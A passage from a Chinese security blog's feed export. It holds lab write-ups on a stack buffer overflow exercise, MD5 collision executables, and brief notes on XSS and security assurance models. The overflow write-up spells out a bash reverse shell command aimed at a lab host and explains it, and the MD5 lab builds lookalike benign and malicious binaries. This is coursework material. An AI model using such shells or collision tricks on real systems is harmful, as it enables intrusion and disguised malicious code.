src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121411812.png" alt="image-20231011121411812"></p><p>修改shellcode中的内容，模仿task1输入：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121420264.png" alt="image-20231011121420264"></p><p>Step4：在执行一次脚本文件，生成新的badfile，并输入给服务器：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121426149.png" alt="image-20231011121426149"></p><p>\4. Reverse shell：</p><p>上述操作只能够执行shell中固定的指令，所以需要把shellcode改为 reverseshell，使得远程用户可以拿到目标主机的root权限：</p><p>Step1：修改bash为</p><p>“&#x2F;bin&#x2F;bash -i &gt; &#x2F;dev&#x2F;tcp&#x2F;10.9.0.1&#x2F;9090 0&lt;&amp;1 2&gt;&amp;1      *”</p><p>&#x2F;bin&#x2F;bash -i: 启动一个交互式的 Bash shell。-i 选项表示交互式模式，即用户可以输入命令并获取输出。</p><p>&gt; &#x2F;dev&#x2F;tcp&#x2F;10.9.0.1&#x2F;9090：将标准输出重定向到攻击者主机的9090端口</p><p>0&lt;&amp;1：表示将用户的标准输入重定向到标准输出</p><p>2&gt;&amp;1：表示将用户的标准错误输出也重定向到标准输出</p><p>而标准输出有重定向到了tcp链接，也就是到了攻击者的主机端口上，这样只要服务端点击了我们上传的badfile他就会自己建立tcp连接，我们就拿到了root权限的shell：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121436878.png" alt="image-20231011121436878"></p><p>Step2：新开一个终端，作为攻击者 开放9090端口，一直监听，等待服务器连接：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121441370.png" alt="image-20231011121441370"></p><p>还可以测试一下是否拿到了权限，结果是肯定的：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121448578.png" alt="image-20231011121448578"></p><h1 id="四、-Task3：Level-2-Attack"><a href="#四、-Task3：Level-2-Attack" class="headerlink" title="四、   Task3：Level-2 Attack"></a>四、   Task3：Level-2 Attack</h1><ol><li>上传良性字符串到10.9.0.6中，查看打印信息：</li></ol><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121457578.png" alt="image-20231011121457578"></p><p>只能看到buffer的起始地址而无法得知ebp的值,也就无法定位ret的地址。</p><ol start="2"><li>根据题目要求，我们知道buffer的范围[100,300]，那么offset就应该在[104,304]之间，且最终的ret地址应该是4的倍数，由于整个shellcode的结构中：ret往高地址方向全部填充的式NOP指令，是无效的，会一直往下面跳转，所以保证返回地址&gt;&#x3D;buf_addr+308,就能够保证eip一定会指向NOP指令或shellcode指令入口处，即使跳转到了NOP所在地址，也一定会执行到shellcode，所以在整个范围中全部填充为ret。</li></ol><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121508846.png" alt="image-20231011121508846"></p><ol start="3"><li>同样的方法创建反弹shell：</li></ol><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121527603.png" alt="image-20231011121527603"></p><h1 id="五、-Task-4-Level-3-Attack"><a href="#五、-Task-4-Level-3-Attack" class="headerlink" title="五、   Task 4: Level-3 Attack"></a>五、   Task 4: Level-3 Attack</h1><ol><li><p>这个任务中32位字变成了64位字，原理都一样，但是正如手册指出，难点在于虽然机器支持64位字，但是最大只能到：0x00007FFFFFFFFFFF，也就是会出现00 00，而scrapy遇到0就停止复制，所以我们需要把想办法解决这个问题。</p></li><li><p>先照常输入查看打印信息：</p></li></ol><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121541707.png" alt="image-20231011121541707"></p><ol start="3"><li>目前想到的解决办法是：在截断之前，就把shellcode全部拷贝进去，此时ret指向前面的shellcode地址，也就是可以改变start的值，不让他在末尾填充，而在一开始填充，ret就是buffer_addr+start。Exploit4.py如下：</li></ol><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121550601.png" alt="image-20231011121550601"></p><p>反弹shell实验如下：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121602353.png" alt="image-20231011121602353"></p><h1 id="六、-Task-5-Level-4-Attack"><a href="#六、-Task-5-Level-4-Attack" class="headerlink" title="六、   Task 5: Level-4 Attack"></a>六、   Task 5: Level-4 Attack</h1><ol><li>本任务中，buffer的大小变小，打印：</li></ol><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121611023.png" alt="image-20231011121611023"></p><p>只相差了96字节，而上一问打印除了shellcode的长度为165字节，显然已经超过了。所以不适于将shellcode放进缓冲区，而放在ret段后面又会被截断，所以采取直接指向原数组中shellcode的地址，因此尽可能将ret设置大一点，跳转到数据段的shellcode代码部分执行shellcode，代码中打印了一下ret的类型以及十六进制值。</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121617494.png" alt="image-20231011121617494"></p><h1 id="七、-Task-6-Experimenting-with-the-Address-Randomization"><a href="#七、-Task-6-Experimenting-with-the-Address-Randomization" class="headerlink" title="七、   Task 6: Experimenting with the Address Randomization"></a>七、   Task 6: Experimenting with the Address Randomization</h1><ol><li>关闭地址随机化：</li></ol><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121626703.png" alt="image-20231011121626703"></p><ol start="2"><li>向server1多次发送连接：</li></ol><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121633606.png" alt="image-20231011121633606"></p><ol start="3"><li>所以只能采取固定返回地址，不断尝试直到连接上目标主机为止，即可运行实验中提供的brute-force.sh：</li></ol><p>就使用原来的exploit.py来尝试：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121642500.png" alt="image-20231011121642500"></p><p>在此只尝试了3分钟就停止了，因为已经感受到了开启随机地址化后，必然将对于缓冲区域溢出攻击产生极大阻碍。</p><h1 id="八、-Tasks-7-Experimenting-with-Other-Countermeasures"><a href="#八、-Tasks-7-Experimenting-with-Other-Countermeasures" class="headerlink" title="八、   Tasks 7: Experimenting with Other Countermeasures"></a>八、   Tasks 7: Experimenting with Other Countermeasures</h1><ol><li>栈溢出保护</li></ol><p>根据实验手册，gcc提供了一种栈保护机制，在开启栈保护机制以后来观察现象：</p><p>首先关闭-fno-stack-protector：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121654532.png" alt="image-20231011121654532"></p><p>重新执行exploit.py生成badfile，将其复制到server-code中，在把badfile作为标准输入，：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121702274.png" alt="image-20231011121702274"></p><p>结果如下：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121711740.png" alt="image-20231011121711740"></p><ol start="2"><li>栈不可执行</li></ol><p>编译call_shellcode.c时不使用-z execstack </p><p><img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121748889.png" alt="image-20231011121748889"></p><p>重新make，在再执行a32.out：</p><p><img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121745086.png" alt="image-20231011121745086"></p><p>出现段错误。这不能避免缓冲区溢出，只是禁止了shellcode的执行。</p><blockquote><p>这里的shellcode使用的是NOP雪橇，实现shellcode的方法还有很多，比如使用jmp esp指令等</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 安全知识 </category>
          
          <category> 网络攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 栈溢出，shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MD5碰撞</title>
      <link href="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/"/>
      <url>/2023/10/11/MD5%E7%A2%B0%E6%92%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="1-作业题目"><a href="#1-作业题目" class="headerlink" title="1    作业题目"></a>1    作业题目</h1><p>实验3：MD5碰撞试验</p><p>a) 使用md5collgen生成两个MD5值相同的文件，并利用bless十六进制编辑器查看输出的两个文件，描述你观察到的情况；</p><p>b) 参考Lab3_task2.c的代码，生成两个MD5值相同但输出不同的两个可执行文件。</p><p>c) 参考Lab3_task3.c的代码，生成两个MD5值相同但代码行为不相同的可执行文件。</p><p>d) 回答问题：通过上面的实验，请解释为什么可以做到不同行为的两个可执行文件具有相同的MD5值？</p><h1 id="2-实验步骤及结果"><a href="#2-实验步骤及结果" class="headerlink" title="2    实验步骤及结果"></a>2    实验步骤及结果</h1><h1 id="一、-使用md5collgen生成两个MD5值相同的文件，并利用bless十六进制编辑器查看输出的两个文件，描述你观察到的情况"><a href="#一、-使用md5collgen生成两个MD5值相同的文件，并利用bless十六进制编辑器查看输出的两个文件，描述你观察到的情况" class="headerlink" title="一、   使用md5collgen生成两个MD5值相同的文件，并利用bless十六进制编辑器查看输出的两个文件，描述你观察到的情况"></a>一、   使用md5collgen生成两个MD5值相同的文件，并利用bless十六进制编辑器查看输出的两个文件，描述你观察到的情况</h1><ol><li>创建一个text文本，利用md5collgen生成两个文件：</li></ol><p>命令为：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011113844687.png" alt="image-20231011113844687">                              </p><p>文件内容为：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011113851441.png" alt="image-20231011113851441"></p><ol start="2"><li>利用工具产生两个文件：</li></ol><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011113913173.png" alt="image-20231011113913173"></p><ol start="3"><li>再查看out1.bin和out2.bin的md5码，发现二者值相同：</li></ol><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011113920547.png" alt="image-20231011113920547"></p><ol start="4"><li>再利用bless十六进制编辑器查看二者的十六进制编码：</li></ol><p>命令为：</p><p>   <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011113929606.png" alt="image-20231011113929606"></p><p>Out1.bin的：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011113934815.png" alt="image-20231011113934815"></p><p>Out2.bin的：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011113941637.png" alt="image-20231011113941637"></p><p>观察得出前缀相同(都是text.txt)，填充内容有不同之处(但是md5相同)</p><p>这与md5collgen的工作原理有关。具体来说，这个工具可以提供生成相同前缀的文件的功能，它从”text.txt”文件中提取前缀，并在必要时对前缀进行零填充，以确保其长度为64的倍数。然后，md5collgen用这些前缀生成两个输出文件，这两个文件的内容都包含在生成的128字节中，但它们之间存在部分差异。具体来说md5collgen通过相同前缀生成MD5相同的文件原理如下：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011113949253.png" alt="image-20231011113949253"></p><ol start="5"><li>最后验证两个文件是否相同：</li></ol><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011113956726.png" alt="image-20231011113956726"></p><p>这证明了两个文件是不同的。</p><h1 id="二、-参考Lab3-task2-c的代码，生成两个MD5值相同但输出不同的两个可执行文件。"><a href="#二、-参考Lab3-task2-c的代码，生成两个MD5值相同但输出不同的两个可执行文件。" class="headerlink" title="二、   参考Lab3_task2.c的代码，生成两个MD5值相同但输出不同的两个可执行文件。"></a>二、   参考Lab3_task2.c的代码，生成两个MD5值相同但输出不同的两个可执行文件。</h1><ol><li>先观察Lab3_task2.c源代码文件：</li></ol><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114003609.png" alt="image-20231011114003609"></p><p>其功能为：将某个字符串以16进制的形式进行打印，中间的数组需要自己填充。</p><ol start="2"><li><p>MD5原理解释：</p><p>  a)  MD5是一个相当复杂的算法，但从很高的层次来看，它并不复杂。MD5将输入数据分成64字节的块，然后在这些块上迭代计算散列。MD5算法的核心是一个压缩函数，它接受两个输入，一个64字节的数据块和前一次迭代的结果。压缩函数产生一个128位的 IHV，它代表“中间散列值”; 这个输出然后被反馈到下一次迭代中。如果当前迭代是最后一次迭代，则 IHV 将是最终的散列值。第一次迭代的 IHV 输入(IHV0)是一个固定值，具体原理如下图所示：</p></li></ol><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114025720.png" alt="image-20231011114025720"></p><p>​b)  MD5 碰撞具有添加后缀依然碰撞的性质: 若 hash(A)&#x3D;hash(B)，则 hash(A+S)&#x3D;hash(B+S) 但是并不满足增加前缀的性质，即 hash(A)&#x3D;hash(B)推不出 hash(S+A)&#x3D;hash(S+B)</p><ol start="3"><li>根据MD5的原理和弱抗碰撞性，可以找到一个构造思路：</li></ol><p>​a)  md5collgen可以构造出前缀相同且MD5相同的两个文件，且其后面填充的128个字节不同：</p><p>​        i.    MD5（perfix||P）&#x3D;MD5（perfix||Q）</p><p>​b)  MD5具有添加后缀依然碰撞的性质，所以可以构造两条消息,使得他们具有相同的前缀和后缀，即我们在数组当中需要去寻找到对应的前缀部分（64字节）中间的128字节，以及后缀，构造消息如下：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114050051.png" alt="image-20231011114050051"></p><p>​        i.    即：MD5（perfix||P||suffix）&#x3D;MD5（perfix||Q||suffix）</p><ol start="4"><li>具体实验步骤如下：</li></ol><p>​a)  首先在xyz数组中填上一些随机值，这里选择全部填为A（ASCLL码&#x3D;0x41），这样便于在bless中查找文件内容位置：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114114808.png" alt="image-20231011114114808"></p><p>​b)  Gcc编译运行文件</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114127917.png" alt="image-20231011114127917"></p><p>​c)  通过bless十六进制编辑器查看Lab3_task2定位字符串部分：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114135127.png" alt="image-20231011114135127"></p><p>​     再定位到A开头的字节偏移位置为：0x3020即第12320个字节</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114143590.png" alt="image-20231011114143590"></p><p>​d)  定位前后缀位置：</p><p>​        i.    由于开头是第12320个字节，寻找最近的64的倍数为：12352，所以确定了前缀分割点为第12352个字节；往后移128个字节，得到第二个分割点为：第12481个字节。</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114150718.png" alt="image-20231011114150718"></p><p>​e)  通过md5collgen利用先前的到的perfix生成两个MD相同的文件，再使用cat吧后缀suffix拼接到后面：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114156546.png" alt="image-20231011114156546"></p><p>​f)  对文件赋予执行权限后输出，验证二者的MD5码是否相同：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114215801.png" alt="image-20231011114215801"></p><p>对比输出，文件不同：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114223076.png" alt="image-20231011114223076"></p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114228155.png" alt="image-20231011114228155"></p><p>再查看文件的MD5码，发现相同：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114233791.png" alt="image-20231011114233791"></p><h1 id="三、-参考Lab3-task3-c的代码，生成两个MD5值相同但代码行为不相同的可执行文件。"><a href="#三、-参考Lab3-task3-c的代码，生成两个MD5值相同但代码行为不相同的可执行文件。" class="headerlink" title="三、  参考Lab3_task3.c的代码，生成两个MD5值相同但代码行为不相同的可执行文件。"></a>三、  参考Lab3_task3.c的代码，生成两个MD5值相同但代码行为不相同的可执行文件。</h1><ol><li>观察task3的伪代码：</li></ol><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114243058.png" alt="image-20231011114243058"></p><p> 他要求我们实现的功能为：设定两个数组，若两个数组内容相同，则执行正常代码；否则，执行恶意代码，对应了题目要求的代码行为不同。</p><ol start="2"><li>构造思路：</li></ol><p>​a)  根据第二问的经验，我们仍然采取切片拼接的方式完成第三问，即将X与Y数组填充相同的值，再在bless中去找到对应的X、Y数组部分。通过切片构造两个可执行文件，其中一个执行后输出benign，另一组则输出malicious。</p><p>​b)  针对连个代码的构造方式如下图所示：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114258858.png" alt="image-20231011114258858"></p><p>上边一组表示X Y数组相同，执行benign；</p><p>下边一组表示X Y数组不同，执行malicious，P、Q表示由md5collgen生成的两个md5值相同的文件的不同部分。</p><ol start="3"><li>操作步骤：</li></ol><p>​a)  针对X、Y数组，首先填充相同的值，使他们一致，代码改动如下：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114338990.png" alt="image-20231011114338990"></p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114345729.png" alt="image-20231011114345729"></p><p>​b)  编译源代码，运行结果如下：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114351418.png" alt="image-20231011114351418"></p><p>可见，运行出来是正常代码。</p><p>​c)  利用bless查看数组的位置仍然是0x3020</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114404185.png" alt="image-20231011114404185"></p><p>​d)  确定切片的位置，前缀为第12352个字节，从gcc开始的那个字节（即第12745）开始往后作为suffix，通过head与tail命令进行处理：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114412923.png" alt="image-20231011114412923"></p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114416894.png" alt="image-20231011114416894"></p><p>​e)  通过md5collgen生成两个MD5相同的文件prefix1_task3、prefix2_task3：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114423269.png" alt="image-20231011114423269"></p><p>​f)  把prefix1_task3 中数组 X的后32个字节+128(md5填充物)&#x3D;160个字节截取出来作为 middle_task3，得到新数组Z：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114437810.png" alt="image-20231011114437810"></p><p>​g)  由于Z的长度为160，还差40个字节才满40，所以需要填充40个字节，这里利用python去构造这40个字节：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114442199.png" alt="image-20231011114442199"></p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114447282.png" alt="image-20231011114447282"></p><p>去除末尾的0A：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114453429.png" alt="image-20231011114453429"></p><p>​h)  最后发现XY之间差了24个字节，对间隔的部分构造：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114459549.png" alt="image-20231011114459549"></p><p>​i)  由此得到了所有构造的部分：</p><p>Benign： prefix1_task3 pure40 pure24 middle_task3  pure40  后缀：suffix_task3</p><p>Malicious:  prefix2_task3 pure40 pure24  middle_task3 pure40 后缀：suffix_task3</p><p>​j)  拼接两组代码并修改执行权限：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114521644.png" alt="image-20231011114521644"></p><p>​k)  比较运行结果：</p><p>MD5值相同：</p><p><img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114545435.png" alt="image-20231011114545435"></p><p>​        运行结果：</p><p><img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114552554.png" alt="image-20231011114552554"></p><p><img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114558443.png" alt="image-20231011114558443"></p><h1 id="四、-回答问题：通过上面的实验，请解释为什么可以做到不同行为的两个可执行文件具有相同的MD5值？"><a href="#四、-回答问题：通过上面的实验，请解释为什么可以做到不同行为的两个可执行文件具有相同的MD5值？" class="headerlink" title="四、   回答问题：通过上面的实验，请解释为什么可以做到不同行为的两个可执行文件具有相同的MD5值？"></a>四、   回答问题：通过上面的实验，请解释为什么可以做到不同行为的两个可执行文件具有相同的MD5值？</h1><p>a) 相同的MD5值：截取第64位倍数的字节作为前缀，通过md5collgen就能够生产相同MD5的两个不同文件，文件不同的部分在前缀之后，利用这个工具就能很快找到MD5（M）&#x3D;MD5（N）的M与N，以后的切片与构造均在这两个文件的基础上。</p><p>b) 不同的行为：其实本质上来说，就是要构造两个二进制编译后的可执行文件，我们利用源代码通过gcc编译后的文件进行切片构造重组。输出benign的那一个编译后的可执行文件对应的两个数组是相同的；输出为malicious的那一个编译后的可执行文件两个数组是不同的。并且这里有一个细节就是当利用md5collgen工具产生了两个不同文件以后，X数组已经改变，所以为了保证benign的正常输出，一定要注意需要用这个文件来切片重构Y数组的代码，不能够保持不变。</p>]]></content>
      
      
      <categories>
          
          <category> 安全知识 </category>
          
          <category> 网络攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 攻防 </tag>
            
            <tag> MD5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss攻击</title>
      <link href="/2023/10/09/xss%E6%94%BB%E5%87%BB/"/>
      <url>/2023/10/09/xss%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h1><p>引诱用户点击按钮，实现漏洞利用</p><ul><li>反弹xss</li><li>存储xss</li><li>DOM xss<ul><li>DOM的使用可以让代码和数据分离</li><li>DOM的使用导致搜索引擎引流不够</li><li>DOM的使用会更加安全</li><li>今天的解决方法：对用户输入进行检测</li></ul></li></ul><h1 id="关注点"><a href="#关注点" class="headerlink" title="关注点"></a>关注点</h1><ul><li>攻击负载（ｐａｙｌｏａｄ）如何传输</li><li>攻击负载（ｐａｙｌｏａｄ）存储在哪里</li></ul><h1 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h1><ul><li>ｃｏｏｋｉｅ开启ｈｔｔｐｏｎｌｙ</li><li>CSP</li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全知识 </category>
          
          <category> 网络攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网安保障</title>
      <link href="/2023/10/09/%E7%BD%91%E5%AE%89%E4%BF%9D%E9%9A%9C/"/>
      <url>/2023/10/09/%E7%BD%91%E5%AE%89%E4%BF%9D%E9%9A%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="网安保障"><a href="#网安保障" class="headerlink" title="网安保障"></a>网安保障</h1><h2 id="知识域一："><a href="#知识域一：" class="headerlink" title="知识域一："></a>知识域一：</h2><h3 id="一、信息"><a href="#一、信息" class="headerlink" title="一、信息"></a>一、信息</h3><h5 id="1-信息概念"><a href="#1-信息概念" class="headerlink" title="1. 信息概念"></a>1. 信息概念</h5><p>- </p><h5 id="2-信息的性质"><a href="#2-信息的性质" class="headerlink" title="2. 信息的性质"></a>2. 信息的性质</h5><ul><li>依附性</li><li>动态性</li><li>可处理性</li><li>共享性</li><li>可传递性</li><li>异步性</li><li>可交换性</li><li>可伪性</li></ul><h3 id="二、网络空间安全的基本属性"><a href="#二、网络空间安全的基本属性" class="headerlink" title="二、网络空间安全的基本属性"></a>二、网络空间安全的基本属性</h3><p>保密性、完整性、可用性</p><h5 id="1-网络空间安全的特征与范畴"><a href="#1-网络空间安全的特征与范畴" class="headerlink" title="1. 网络空间安全的特征与范畴"></a>1. 网络空间安全的特征与范畴</h5><ul><li>特征<ul><li>是系统的安全</li><li>动态的安全</li><li>无边界的安全</li><li>非传统的安全</li></ul></li><li>范畴</li></ul><h5 id="2-网络空间安全发展阶段"><a href="#2-网络空间安全发展阶段" class="headerlink" title="2. 网络空间安全发展阶段"></a>2. 网络空间安全发展阶段</h5><p>…</p><ul><li><h2 id="CS（三位一体）-网络防御-网络攻击"><a href="#CS（三位一体）-网络防御-网络攻击" class="headerlink" title="CS（三位一体）- 网络防御- 网络攻击"></a>CS（三位一体）<br>- 网络防御<br>- 网络攻击</h2></li></ul><h2 id="2-知识域二：网络空间安全保障"><a href="#2-知识域二：网络空间安全保障" class="headerlink" title="2.知识域二：网络空间安全保障"></a>2.知识域二：网络空间安全保障</h2><h3 id="一、网络安全保障定义"><a href="#一、网络安全保障定义" class="headerlink" title="一、网络安全保障定义"></a>一、网络安全保障定义</h3><ul><li>防止信息泄露、修改、破坏</li><li>网络空间安全保障是一种立体的保障</li><li>网络空间安全保障VS信息安全（ppt）</li></ul><h3 id="二、网络安全保障模型"><a href="#二、网络安全保障模型" class="headerlink" title="二、网络安全保障模型"></a>二、网络安全保障模型</h3><ol><li><p>基于时间的PDR模型（没有引入人）</p><ul><li>保护（Protection）——加密鉴别、访问控制、防火墙、防病毒</li><li>检测（Detection）——入侵检测、漏洞检测、网络扫描</li><li>相应（Response）——紧急响应、异常处理、建立应急响应机制</li><li>思想：承认漏洞、正视威胁、<strong>适度防护</strong>(追求绝对安全是无意义的)、加强监测</li><li>出发点：任何保护措施都 <strong>基于时间</strong></li><li>核心与本质：给出攻击时间表</li><li>缺点：难以适应快速变化的网络环境</li></ul></li><li><p>PDRR模型</p><ul><li>保护</li><li>检测</li><li>响应</li><li>恢复</li></ul></li><li><p>PPDR模型</p><ul><li><p>防护</p></li><li><p>策略（Policy）</p></li><li><p>检测</p></li><li><p>响应</p></li><li><p>保护、检测、响应因为策略组成了一个完整的、动态的安全循环</p></li><li><p>分布式动态主动模型</p></li><li><p>强调落实反应、强调控制对抗、更强调人（策略是人制定的）</p></li><li><p>数学法则：</p><ul><li>Pt&#x3D;防护时间（有效防御攻击的时间）</li><li>Dt&#x3D;检测时间（发起到检测）</li><li>Rt&#x3D;反应时间（检测到 到处理完）</li><li>Et&#x3D;暴露时间</li><li>Pt&gt;Dt+Rt,那么S是安全的（在发起攻击到攻击结束 都没有吧系统攻破）；反之，Et&#x3D;（Dt+Rt）-Pt</li></ul></li></ul></li><li><p>IATF——深度防御保障模型</p><ul><li>信息保障技术框架</li><li>系统工程、系统采购、风险管理、鉴别和鉴定以及生命周期支持等过程。</li><li>深度体现：<ul><li>强调：人、技术、操作</li><li>关注4个方面的保障（三保护一支撑）<ul><li>本地计算环境</li><li>区域边界<ul><li>安全措施控制的环境（物理、逻辑）</li><li>网络设备接入点</li><li>目标：对进出某区域的数据流有效控制与监控</li><li>方法：恶意代码、病毒检测、防火墙、入侵检测、远程访问、多级别安全</li></ul></li><li>网络和基础设施<ul><li>目标：防止数据的非法泄露、防止收到拒绝服务攻击、防止受到保护信息在发送过程中的时延、互传未发送</li><li>方法：保障骨干网可用性的方法、无线网络安全框架、系统高度互联和虚拟专用网</li></ul></li><li>支撑性基础设施<ul><li>目标：为安全保障措施提供一套相互关联的活动与基础设施<ul><li>密钥管理</li><li>检测和响应</li></ul></li><li>方法：密钥管理、优先权管理、证书管理、审计配置、信息调查、收集 </li><li>比如统一身份认证平台</li></ul></li></ul></li></ul></li></ul></li></ol><h3 id="三、信息系统的安全保障"><a href="#三、信息系统的安全保障" class="headerlink" title="三、信息系统的安全保障"></a>三、信息系统的安全保障</h3><ol><li><p>定义</p><ul><li>在改革生命周期，技术，管理工程和人员，确保三性（机密 完整 可用），保证系统实现组织系统使命</li></ul></li><li><p>评估</p><ul><li>方面：安全技术、安全管理、安全工程</li></ul></li><li><p>概念与关系</p><ul><li>脆弱性+威胁—&gt;风险</li><li>保障</li></ul></li><li><p>保障模型</p><ul><li>保障要素：技术、工程、管理、人员</li><li>生命周期：计划组织、开发采购、实施交付、运行维护、废弃<ul><li>在整个生命周期中实现对保障要素的保障</li></ul></li><li>安全特征：机密、完整、可用</li><li>最终目的：最终目的不是保护信息系统，而是保障组织机构实现其业务使命。</li></ul></li></ol><h2 id="知识域2："><a href="#知识域2：" class="headerlink" title="知识域2："></a>知识域2：</h2><h3 id="一、网络空间安全保障现状"><a href="#一、网络空间安全保障现状" class="headerlink" title="一、网络空间安全保障现状"></a>一、网络空间安全保障现状</h3><ol><li>包含方面<ul><li>战略</li><li>组织</li><li>军事</li><li>外交</li><li>科技</li><li>保障：关键基础设施仍然是网络空间安全保障的最核心内容</li></ul></li><li>美国网安保障战略：<ul><li>一个轮回，三届政府，四个文件</li><li>美国的CNCI：网络曼哈顿计划</li><li>三道防线，十二项提议</li></ul></li><li>英国<ul><li>强调国际</li></ul></li><li>分析总结<ul><li>银行和金融很重要‘</li><li>这里专门负责处理网络信息安全问题</li><li>大部分的观念：防范入侵和打击网络犯罪</li><li>基本做法…..</li></ul></li></ol><h3 id="二、我国网络安全保障工作主要内容"><a href="#二、我国网络安全保障工作主要内容" class="headerlink" title="二、我国网络安全保障工作主要内容"></a>二、我国网络安全保障工作主要内容</h3><p>我国的思路：</p><p>​1. 以维护国家利益为根本出发点，服务于国家发展和安全</p><ol start="2"><li>突出保障，以推动自主创新</li><li>从法律管理技术和人才入手</li></ol><h3 id="1-应急管理与信息通报"><a href="#1-应急管理与信息通报" class="headerlink" title="1. 应急管理与信息通报"></a>1. 应急管理与信息通报</h3><h3 id="2-等保制度"><a href="#2-等保制度" class="headerlink" title="2. 等保制度"></a>2. 等保制度</h3><h3 id="3-网络安全风险评估"><a href="#3-网络安全风险评估" class="headerlink" title="3. 网络安全风险评估"></a>3. 网络安全风险评估</h3><h3 id="4-灾难恢复"><a href="#4-灾难恢复" class="headerlink" title="4. 灾难恢复"></a>4. 灾难恢复</h3><h2 